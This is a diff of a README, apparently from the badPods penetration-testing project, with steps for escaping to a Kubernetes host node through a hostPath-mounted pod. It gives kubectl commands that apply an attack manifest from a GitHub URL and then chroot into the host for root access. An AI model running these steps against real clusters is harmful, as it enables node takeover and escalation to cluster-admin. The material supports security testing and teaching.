@@ -1,19 +1,19 @@
 # You can create a pod with only a hostpath mount, but it is unrestricted 
 If there are no pod admission controllers applied,or a really lax policy, you can create a pod that has complete access to the host node. You essentially have a root shell on the host, which provides a path to cluster-admin. 
 
-[pod-everything-allowed.yaml](pod-everything-allowed.yaml)
+[pod-hostpath-only.yaml](pod-hostpath-only.yaml)
 
 ### Create a pod
 ```bash
 # Option 1: Create pod from local yaml 
-kubectl apply -f pod-everything-allowed.yaml  
+kubectl apply -f pod-hostpath-only.yaml  
 # Option 2: Create pod from github hosted yaml
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/everything-allowed/pod-everything-allowed.yaml  
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostpath-only/pod-hostpath-only.yaml  
 ```
 
 ### Exec into pod 
 ```bash
-kubectl -n [namespace] exec -it pod-everything-allowed -- chroot /host
+kubectl -n [namespace] exec -it pod-hostpath-only -- chroot /host
 
 ```
 
